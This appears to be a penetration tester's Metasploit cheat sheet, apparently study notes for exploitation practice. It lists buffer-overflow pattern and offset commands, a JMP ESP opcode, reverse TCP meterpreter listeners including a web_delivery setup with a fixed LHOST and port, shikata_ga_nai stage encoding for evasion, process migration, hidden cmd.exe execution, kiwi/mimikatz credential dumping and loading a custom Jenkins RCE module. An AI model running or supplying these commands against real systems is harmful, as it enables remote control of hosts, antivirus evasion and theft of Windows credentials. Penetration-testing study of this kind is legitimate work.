###### Testing buffer size
msf-pattern_create -l 800  
msf-pattern_create -l 2000 -s ABCDEF,def,1234(custom chars set,it can remove some specific bad chars)  
msf-pattern_offset -l 800 -q 42306142

###### To find the opcode equivalent of JMP ESP
```
msf-nasm_shell  
nasm > jmp esp  
00000000  FFE4              jmp esp  
```
###### Migrate shell into notepad.exe process
```
set AutoRunScript post/windows/manage/migrate #stable the shell
```
###### Metasploit Pose-exploit commands:
```
bg
show sessions
sessions id
quit # 退出会话
execute -H -i -f cmd.exe # 创建新进程cmd.exe，-H不可见，-i交互
```
###### Settingg up local listener
```
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
show options
set LHOST ip
set LPORT port
exploit
```
###### Setting up local powershell reverse tcp listener
```
use exploit/multi/script/web_delivery
set target 2 #important
set payload windows/x64/meterpreter/reverse_tcp
set lhost 192.168.199.128
set lport 4444
run
```
###### multi/handler payload encode
```
set EnableStageEncoding true
set StageEncoder x86/shikata_ga_nai
```
###### Migrating Processes
Note that we are only able to migrate into a process executing at the same privilege and integrity level or lower than that of our current process.
```
ps
migrate pid
```
###### Meterpreter command to use powershell
```
meterpreter > :
load powershell
help powershell
powershell_execute "$PSVersionTable.PSVersion"
```
###### Meterpreter command to use mimikatz
```
meterpreter > :
load kiwi
getsystem
creds_msv
```
##### Add own rb exploit
exploit/multi/http/jenkins_nodejs_rce
```
under /home/kali/.msf4
create ../exploits/multi/http folder
put rb in it
msfconsole
search name
```
